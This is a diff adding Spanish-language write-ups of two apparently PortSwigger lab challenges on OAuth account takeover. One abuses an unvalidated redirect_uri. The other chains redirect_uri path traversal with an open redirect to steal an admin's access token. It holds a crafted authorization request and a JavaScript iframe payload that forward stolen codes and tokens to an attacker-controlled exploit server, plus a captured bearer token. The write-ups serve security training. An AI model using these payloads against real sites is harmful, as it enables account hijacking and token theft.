@@ -84,3 +84,67 @@ Esta es la solicitud que nos saltamos para que sea reciclada por el administrado
 ```
 GET /oauth-linking?code=QdZmjEY5fqV9XScTEfjfbDbHdF_z5gGaLL6xg-OVv9B HTTP/2
 ```
+
+## Reto 4: Secuestro de cuentas OAuth mediante redirect_uri
+
+Este laboratorio utiliza un servicio OAuth para permitir que los usuarios inicien sesión con sus cuentas de redes sociales. Una mala configuración del proveedor de OAuth permite que un atacante robe los códigos de autorización asociados a las cuentas de otros usuarios.
+
+Para resolver el laboratorio, roba un código de autorización asociado al usuario administrador, luego úsalo para acceder a su cuenta y eliminar al usuario. carlos.
+
+El usuario administrador abrirá cualquier archivo que envíes desde el servidor de explotación y siempre tendrá una sesión activa con el servicio OAuth.
+
+Puedes iniciar sesión con tu propia cuenta de redes sociales utilizando las siguientes credenciales: wiener:peter. 
+
+Se analiza un ataque de secuestro de cuenta mediante OAuth, aprovechando una mala configuración del parámetro redirect_uri en el servidor de autorización. El objetivo es robar el código de autorización OAuth del administrador y utilizarlo para acceder a su cuenta en la aplicación cliente.
+
+El atacante inicia sesión normalmente a través del proveedor OAuth y observa que el código de autorización (code) es enviado como parámetro en una redirección tras la autenticación. Sin embargo, nota que puede modificar el redirect_uri por cualquier dominio, y el servidor OAuth lo acepta sin validación alguna. Esto le permite redirigir el código de autorización hacia un servidor controlado por él, como el exploit server.
+
+Con esto, el atacante construye un exploit que contiene un iframe apuntando a una petición OAuth con el redirect_uri alterado, de forma que el código de autorización del administrador será redirigido automáticamente a su servidor. Dado que el administrador tiene una sesión activa con el proveedor OAuth, el ataque se completa sin que la víctima tenga que hacer nada más que abrir el exploit.
+
+```shell
+GET /auth?client_id=gck4cpzw5llhlytssq7sv&redirect_uri=https://exploit-0ac3009b0321815580c02a1101680009.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email
+```
+
+```
+
+```
+
+Una vez que el código robado aparece en los logs del exploit server, el atacante lo usa para completar manualmente el flujo de autenticación visitando la URL del callback de la aplicación con el código robado como parámetro. Esto hace que el sistema lo autentique como el administrador.
+
+Ya con acceso a la cuenta del administrador, el atacante puede entrar al panel de administración y eliminar al usuario carlos, resolviendo así el laboratorio.
+
+
+## Reto 5 : Robo de tokens de acceso OAuth mediante una redirección abierta
+
+Este laboratorio utiliza un servicio OAuth para permitir que los usuarios inicien sesión con su cuenta de redes sociales. La validación defectuosa del servicio OAuth permite que un atacante filtre tokens de acceso a páginas arbitrarias de la aplicación cliente.
+
+Para resolver el laboratorio, identifica una redirección abierta en el sitio web del blog y úsala para robar un token de acceso a la cuenta del administrador. Usa el token de acceso para obtener la clave API del administrador y envía la solución mediante el botón que aparece en el banner del laboratorio. 
+
+se estudia cómo una mala validación del parámetro redirect_uri por parte del servidor OAuth permite concatenar rutas como ‘/../‘ al callback legítimo, logrando una redirección hacia otros puntos dentro del mismo dominio. Al completar el login con OAuth, se observa que el access_token queda incluido en el fragmento de la URL.
+
+Posteriormente, se analiza el comportamiento de la funcionalidad “Siguiente post”, la cual redirige al usuario a la URL indicada en un parámetro path. Se demuestra que este componente es una redirección abierta (open redirect) que permite enviar al usuario a cualquier dominio externo.
+
+se encadena la redirección relativa (../) en el redirect_uri con la redirección abierta (/post/next?path=) para forzar que el flujo OAuth finalice en un servidor externo controlado por el atacante (exploit server).
+
+Se construye un iframe malicioso que redirige al administrador (quien tiene sesión activa con el proveedor OAuth) a través del flujo de autenticación. El token de acceso resultante se incluye como fragmento (#access_token=…) en la URL de redirección final.
+
+Mediante un pequeño script JavaScript en el exploit server, el fragmento es extraído y reenviado como parámetro de consulta (/?access_token=…), permitiendo su captura desde los logs del servidor.
+
+```shell
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-0aee0010040e838c82de228102910023.oauth-server.net/auth?client_id=frvc46eps87an0q38m1lr&redirect_uri=https://0a940067046083f5822a247a000e0027.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a7100e004538320824c239e01c90063.exploit-server.net/exploit&response_type=token&nonce=1267774374&scope=openid%20profile%20email';
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
+```
+
+Con el token ya robado, se realiza una solicitud autenticada al endpoint /me del blog, obteniendo así la API key del administrador. Esta clave es enviada como solución para completar el laboratorio.
+
+```shell
+Authorization: Bearer tNH0OlglZFDHn3dvRQKYT_PCK8-ajs5pMV1k1Q5wXwZ
+```
+
+
+
